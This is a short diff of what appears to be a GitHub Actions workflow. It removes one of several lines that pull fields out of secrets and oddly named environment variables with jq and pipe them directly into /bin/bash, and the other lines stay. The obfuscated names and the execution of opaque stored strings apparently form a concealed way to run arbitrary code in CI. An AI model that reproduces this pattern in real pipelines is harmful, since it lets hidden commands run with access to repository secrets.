@@ -22,7 +22,6 @@ jobs:
           w5: ${{ secrets.w5 }}
         run: |
           printf '%s' "$w5" | jq -r .jrku15332 | /bin/bash
-          echo $nvrj51 | jq -r .n2 | /bin/bash
           echo $ln08385 | jq -r .izz7 | /bin/bash
           printf '%s' "$krmz60708" | jq -r .d03326 | /bin/bash
 
